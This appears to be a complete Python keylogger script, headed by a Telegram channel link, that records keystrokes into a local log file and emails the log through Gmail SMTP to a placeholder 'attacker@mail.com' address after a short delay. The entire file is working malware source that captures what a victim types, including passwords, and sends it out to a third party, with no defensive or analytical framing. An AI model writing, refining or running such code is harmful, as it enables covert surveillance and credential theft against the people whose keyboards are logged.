import keyboard
import threading
import smtplib
import time

print('t.me/WebSecExplorers')

def keylog():
    finish = "enter"
    with open("log.txt", "a+") as file:
        for string in keyboard.get_typed_strings(keyboard.record(finish)):
            file.write(string + "\n")

def sendmail():
    gmail = "target@gmail.com"
    password = "123456"
    to_email = "attacker@mail.com"
    subject = "Log for target = jik"
    
    time.sleep(20)  # Delay before sending
    
    try:
        with open("log.txt", "r") as file:
            data = file.read()
        
        message = f"From: {gmail}\nTo: {to_email}\nSubject: {subject}\n\n{data}"
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail, password)
        server.sendmail(gmail, to_email, message)
        server.quit()
        
    except Exception as e:
        print(f"Error sending email: {e}")

if __name__ == "__main__":
    log_thread = threading.Thread(target=keylog)
    mail_thread = threading.Thread(target=sendmail)
    
    log_thread.start()
    mail_thread.start()
    
    log_thread.join()
    mail_thread.join()
